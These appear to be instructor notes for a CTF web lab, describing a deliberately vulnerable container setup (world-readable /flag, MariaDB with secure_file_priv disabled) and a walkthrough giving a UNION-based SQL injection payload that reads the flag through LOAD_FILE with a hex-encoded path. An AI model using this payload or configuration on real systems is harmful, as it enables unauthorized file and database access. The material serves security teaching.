# Instructor notes: Webshop

## Deployment

Service port: **10018** (HTTP, internal 80).
Deployed via `ctf-challenge-deployer` as container `ssp-lab05-04_webshop`.

The real flag is at `/flag` (world-readable) on the container filesystem.
`LOAD_FILE('/flag')` is enabled via `secure_file_priv=` in `deploy/mariadb.cnf`.
The web root contains a decoy file to distinguish students who read the file directly from those who used the SQL injection path.

## Exploit walkthrough

```
?id=0+UNION+SELECT+1,LOAD_FILE(0x2f666c6167),3,4
```

`0x2f666c6167` is `/flag` in hex — avoids quoting issues.
The injected row is echoed in the product "name" column.

## Common mistakes

Students try `LOAD_FILE('/flag')` with single quotes; the WAF-free version still works but quoting can cause parse errors.
Using a hex literal (`0x2f666c6167`) avoids this.
`LOAD_FILE` returns NULL if the file is not readable; confirm with `SELECT @@secure_file_priv` first.
